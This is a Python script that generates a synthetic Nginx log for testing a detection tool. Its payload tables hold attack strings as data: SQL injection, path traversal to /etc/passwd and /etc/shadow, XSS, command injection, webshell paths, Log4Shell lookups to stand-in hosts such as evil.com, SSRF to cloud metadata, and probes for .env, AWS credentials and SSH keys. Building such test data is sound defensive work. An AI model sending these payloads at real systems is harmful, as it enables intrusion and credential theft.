# -*- coding: utf-8 -*-
"""
演示日志生成器

生成一份贴近真实站点的 Nginx combined 格式访问日志（默认 12000 行），
其中刻意混入各类攻击与异常流量，用于演示工具的检测能力。

混入的异常类型：
1. 高频扫描 IP       -- 单 IP 数千次请求
2. 短时间突发        -- 60 秒内密集请求
3. SQL 注入          -- union select / or 1=1 / sleep()
4. 路径遍历          -- ../../etc/passwd
5. XSS               -- <script> / onerror=
6. 命令注入          -- ;cat /etc/passwd
7. WebShell 访问     -- /shell.php, c99.php
8. 后台入口探测      -- /admin, /phpmyadmin
9. Log4Shell         -- ${jndi:ldap://...}
10. SSRF             -- 169.254.169.254
11. 敏感文件探测     -- /.env, /.git/config, wp-config.php
12. 可疑 UA          -- sqlmap / nmap / nikto / 空 UA
13. 异常 HTTP 方法   -- PUT / DELETE / TRACE
14. 5xx 服务端错误   -- 制造错误率尖峰

用法：
    python tools/generate_log.py                    # 默认 12000 行
    python tools/generate_log.py -n 30000           # 指定行数
    python tools/generate_log.py -o data/my.log     # 指定输出
"""

from __future__ import annotations

import argparse
import os
import random
from datetime import datetime, timedelta

# 基础数据

# 正常用户 IP 池（模拟各地访问者）
NORMAL_IPS = [
    "223.104.{}.{}".format(random.randint(1, 254), random.randint(1, 254))
    for _ in range(60)
] + [
    "116.25.{}.{}".format(random.randint(1, 254), random.randint(1, 254))
    for _ in range(50)
] + [
    "183.{}.{}.{}".format(random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
    for _ in range(40)
] + [
    "58.246.{}.{}".format(random.randint(1, 254), random.randint(1, 254))
    for _ in range(30)
]

# 攻击者 / 扫描器 IP
ATTACKER_IPS = [
    "45.155.205.19",    # 主扫描器：高频 + 全类型攻击
    "185.220.101.42",   # SQL 注入专用
    "89.248.165.201",   # 路径遍历 + 敏感文件
    "194.26.29.114",    # 后台入口爆破
    "103.146.23.87",    # WebShell + 命令注入
    "5.188.62.11",      # 突发流量
    "167.94.138.62",    # Log4Shell / SSRF
    "212.192.241.11",   # XSS + 编码绕过
]

# 正常页面
NORMAL_PAGES = [
    "/", "/index.html", "/about", "/contact", "/products", "/products/list",
    "/news", "/news/2026/10/01/hello-world", "/api/user/profile",
    "/api/products", "/static/css/main.css", "/static/js/app.js",
    "/static/img/logo.png", "/static/img/banner.jpg", "/favicon.ico",
    "/robots.txt", "/sitemap.xml", "/login", "/register", "/search?q=python",
    "/user/1001", "/user/1002", "/user/1003", "/article/256", "/article/257",
    "/download/manual.pdf", "/blog", "/blog/python-tips", "/cart", "/checkout",
]

# 静态资源
STATIC_FILES = ["/static/css/main.css", "/static/js/app.js", "/static/js/vendor.js",
                "/static/img/logo.png", "/static/img/banner.jpg", "/favicon.ico"]

# 正常 User-Agent
NORMAL_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/119.0.0.0 Safari/537.36",
]

# 可疑 User-Agent
SUSPICIOUS_UAS = [
    "sqlmap/1.7.11#stable (https://sqlmap.org)",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "Nikto/2.5.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) python-requests/2.31.0",
    "Go-http-client/1.1",
    "curl/8.4.0",
    "Wget/1.21.3",
    "masscan/1.3.2",
    "Scrapy/2.11.0 (+https://scrapy.org)",
    "WPScan v3.8.24 (https://wpscan.com/wordpress-security-scanner)",
    "-",   # 空 UA
]

# 各类攻击载荷
PAYLOADS = {
    "sqli": [
        "/api/products?id=1' UNION SELECT username,password FROM users--",
        "/api/products?id=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL",
        "/search?q=test' OR '1'='1",
        "/login?user=admin' OR 1=1#&pass=x",
        "/api/user?id=1 AND SLEEP(5)",
        "/api/user?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
        "/api/order?no=1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "/api/items?id=1; UPDATEXML(1,CONCAT(0x7e,USER()),1)",
        "/index.php?id=-1 union select 1,2,3,group_concat(table_name) from information_schema.tables",
    ],
    "traversal": [
        "/../../../../etc/passwd",
        "/files?name=../../../etc/shadow",
        "/download?file=..%2f..%2f..%2fetc%2fpasswd",
        "/static/..%252f..%252fetc%252fpasswd",
        "/view?path=....//....//etc/hosts",
        "/api/file?path=..\\..\\windows\\win.ini",
    ],
    "sensitive": [
        "/.env", "/.git/config", "/wp-config.php", "/.aws/credentials",
        "/proc/self/environ", "/../../.git/HEAD", "/backup/db.sql",
        "/.DS_Store", "/id_rsa", "/.svn/entries",
    ],
    "xss": [
        "/search?q=<script>alert(document.cookie)</script>",
        "/comment?text=%3Cscript%3Ealert(1)%3C/script%3E",
        "/profile?name=<img src=x onerror=alert(1)>",
        "/redirect?url=javascript:alert(document.domain)",
        "/search?q=<svg/onload=alert('XSS')>",
    ],
    "cmdi": [
        "/api/ping?host=127.0.0.1; cat /etc/passwd",
        "/api/ping?host=localhost|whoami",
        "/tools?cmd=$(id)",
        "/api/exec?c=`uname -a`",
        "/ping?ip=8.8.8.8 && ls -la",
    ],
    "webshell": [
        "/uploads/shell.php", "/cgi-bin/c99.php", "/r57.php", "/cmd.php",
        "/images/backdoor.php", "/api/eval.php?c=system('id')",
        "/x.php?code=base64_decode('c3lzdGVtKCdpZCcp')",
    ],
    "admin": [
        "/admin", "/admin/login.php", "/phpmyadmin/", "/manager/html",
        "/wp-login.php", "/xmlrpc.php", "/actuator/env", "/swagger-ui.html",
        "/druid/index.html", "/console", "/solr/admin/info/system",
    ],
    "log4j": [
        "/?x=${jndi:ldap://evil.com:1389/Exploit}",
        "/api/log?msg=${jndi:rmi://45.155.205.19:1099/obj}",
        "/search?q=${${lower:j}ndi:ldap://attacker.cn/a}",
        "/?q=%24%7bjndi:ldap://evil.cn/x%7d",
    ],
    "ssrf": [
        "/api/fetch?url=http://169.254.169.254/latest/meta-data/",
        "/proxy?target=http://127.0.0.1:8080/admin",
        "/api/img?src=file:///etc/passwd",
        "/fetch?u=gopher://127.0.0.1:6379/_INFO",
        "/api/read?f=php://filter/resource=index.php",
        "/api/load?url=http://192.168.1.1/login.cgi",
    ],
    "encoded": [
        "/api/file?name=%00.jpg",
        "/view?p=..%c0%af..%c0%afetc%c0%afpasswd",
        "/read?f=%252e%252e%252fetc%252fpasswd",
        "/dl?f=..%%32%65%%32%65/passwd",
    ],
}

# 异常 HTTP 方法
ABNORMAL_METHODS = ["PUT", "DELETE", "TRACE", "CONNECT", "OPTIONS", "PATCH"]

# Referer 池
REFERERS = ["-", "https://www.google.com/", "https://www.baidu.com/",
            "https://example.com/", "https://news.qq.com/", "-", "-"]

# 日志行构造

_MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
           "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

def fmt_time(dt: datetime) -> str:
    """转成 Nginx 时间格式：10/Oct/2026:13:55:36 +0800"""
    return "{:02d}/{}/{:04d}:{:02d}:{:02d}:{:02d} +0800".format(
        dt.day, _MONTHS[dt.month - 1], dt.year,
        dt.hour, dt.minute, dt.second
    )

def make_line(ip: str, dt: datetime, method: str, path: str,
              status: int, size: int, referer: str, ua: str) -> str:
    """构造一条 combined 格式日志行。"""
    return '{} - - [{}] "{} {} HTTP/1.1" {} {} "{}" "{}"'.format(
        ip, fmt_time(dt), method, path, status, size, referer, ua
    )

def pick_status() -> int:
    """按真实站点分布随机状态码。"""
    r = random.random()
    if r < 0.80: return 200
    if r < 0.86: return 304
    if r < 0.90: return 301
    if r < 0.955: return 404
    if r < 0.975: return 403
    if r < 0.99: return 500
    return 502

def status_for_attack(kind: str) -> int:
    """攻击请求通常被 WAF/服务端拒绝。"""
    r = random.random()
    if kind in ("admin", "sensitive", "traversal"):
        return 404 if r < 0.6 else (403 if r < 0.9 else 200)
    if kind == "webshell":
        return 200 if r < 0.3 else 404
    return 400 if r < 0.5 else (403 if r < 0.8 else 500)

# 生成器

def generate(total: int = 12000, out_path: str = None, seed: int = 20261102):
    random.seed(seed)
    lines = []

    # 时间轴：最近 3 天
    end = datetime(2026, 10, 31, 23, 59, 59)
    start = end - timedelta(days=3)

    # 1) 正常流量（约 62%）
    n_normal = int(total * 0.62)
    for _ in range(n_normal):
        # 白天访问更密集：用三角分布模拟作息
        hour = int(random.triangular(0, 23, 14))
        dt = start + timedelta(
            seconds=random.randint(0, int((end - start).total_seconds())))
        dt = dt.replace(hour=hour,
                        minute=random.randint(0, 59),
                        second=random.randint(0, 59))
        ip = random.choice(NORMAL_IPS)
        path = random.choice(NORMAL_PAGES)
        status = pick_status()
        size = random.randint(200, 48000) if status == 200 else random.randint(150, 900)
        lines.append(make_line(ip, dt, "GET", path, status, size,
                               random.choice(REFERERS), random.choice(NORMAL_UAS)))

    # 2) 高频扫描 IP（约 20%，集中在 1 个 IP）
    n_scan = int(total * 0.20)
    scan_ip = ATTACKER_IPS[0]
    scan_start = datetime(2026, 10, 30, 2, 10, 0)
    for i in range(n_scan):
        dt = scan_start + timedelta(seconds=i * random.randint(1, 4))
        # 扫描器主要打后台入口和敏感文件，绝大多数 404
        if random.random() < 0.7:
            path = random.choice(PAYLOADS["admin"] + PAYLOADS["sensitive"])
            status = 404
        else:
            path = random.choice(NORMAL_PAGES)
            status = pick_status()
        ua = random.choice(SUSPICIOUS_UAS[:5])
        lines.append(make_line(scan_ip, dt, "GET", path, status,
                               random.randint(150, 1200), "-", ua))

    # 3) 短时间突发流量（约 6%，60 秒内密集）
    n_burst = int(total * 0.06)
    burst_ip = ATTACKER_IPS[5]
    burst_start = datetime(2026, 10, 29, 21, 15, 0)
    for i in range(n_burst):
        dt = burst_start + timedelta(seconds=i * 60 // n_burst)
        path = random.choice(NORMAL_PAGES)
        lines.append(make_line(burst_ip, dt, "GET", path,
                               random.choice([200, 200, 404, 403]),
                               random.randint(300, 9000), "-",
                               random.choice(["Go-http-client/1.1",
                                              "python-requests/2.31.0"])))

    # 4) 各类定向攻击（约 8%）
    n_attack = int(total * 0.08)
    kinds = list(PAYLOADS.keys())
    weights = [0.22, 0.14, 0.14, 0.10, 0.08, 0.06, 0.10, 0.08, 0.05, 0.03]
    for _ in range(n_attack):
        kind = random.choices(kinds, weights=weights, k=1)[0]
        ip = random.choice(ATTACKER_IPS[1:])
        dt = start + timedelta(seconds=random.randint(
            0, int((end - start).total_seconds())))
        path = random.choice(PAYLOADS[kind])
        status = status_for_attack(kind)
        ua = random.choice(SUSPICIOUS_UAS)
        lines.append(make_line(ip, dt, "GET", path, status,
                               random.randint(150, 4000), "-", ua))

    # 5) 异常 HTTP 方法（约 1.5%）
    n_abn = int(total * 0.015)
    for _ in range(n_abn):
        dt = start + timedelta(seconds=random.randint(
            0, int((end - start).total_seconds())))
        lines.append(make_line(
            random.choice(ATTACKER_IPS), dt,
            random.choice(ABNORMAL_METHODS),
            random.choice(NORMAL_PAGES + ["/api/data", "/admin/config"]),
            random.choice([405, 403, 501, 200]),
            random.randint(100, 800), "-",
            random.choice(SUSPICIOUS_UAS)
        ))

    # 6) 5xx 错误尖峰（约 2.5%，制造服务端故障时段）
    n_5xx = int(total * 0.025)
    fault_start = datetime(2026, 10, 30, 15, 30, 0)
    for i in range(n_5xx):
        dt = fault_start + timedelta(seconds=random.randint(0, 1800))
        lines.append(make_line(
            random.choice(NORMAL_IPS), dt,
            random.choice(["GET", "POST"]),
            random.choice(["/api/order", "/api/pay", "/checkout", "/api/user/profile"]),
            random.choice([500, 500, 502, 503]),
            random.randint(200, 700), random.choice(REFERERS),
            random.choice(NORMAL_UAS)
        ))

    # 7) 空 UA 的探测（补齐剩余）
    while len(lines) < total:
        dt = start + timedelta(seconds=random.randint(
            0, int((end - start).total_seconds())))
        lines.append(make_line(
            random.choice(NORMAL_IPS + ATTACKER_IPS), dt, "GET",
            random.choice(NORMAL_PAGES), random.choice([200, 404]),
            random.randint(200, 9000), "-", "-"
        ))

    # 排序并写出
    def sort_key(line):
        # 从行中提取时间串用于排序（形如 [31/Oct/2026:23:59:59 +0800]）
        try:
            t = line.split("[")[1].split("]")[0]
            return datetime.strptime(t, "%d/%b/%Y:%H:%M:%S %z")
        except Exception:
            return datetime.min

    lines.sort(key=sort_key)

    if out_path is None:
        out_path = os.path.join(os.path.dirname(os.path.dirname(
            os.path.abspath(__file__))), "data", "sample_access.log")
    os.makedirs(os.path.dirname(out_path), exist_ok=True)

    with open(out_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + "\n")

    return out_path, len(lines)

def main():
    ap = argparse.ArgumentParser(description="生成演示用网站访问日志")
    ap.add_argument("-n", "--num", type=int, default=12000, help="日志行数，默认 12000")
    ap.add_argument("-o", "--out", default=None, help="输出文件路径")
    ap.add_argument("-s", "--seed", type=int, default=20261102, help="随机种子")
    args = ap.parse_args()

    path, count = generate(args.num, args.out, args.seed)
    size_mb = os.path.getsize(path) / 1024 / 1024
    print("=" * 56)
    print(f"  演示日志生成完成")
    print(f"  路径：{path}")
    print(f"  行数：{count:,} 行")
    print(f"  大小：{size_mb:.2f} MB")
    print("=" * 56)

if __name__ == "__main__":
    main()
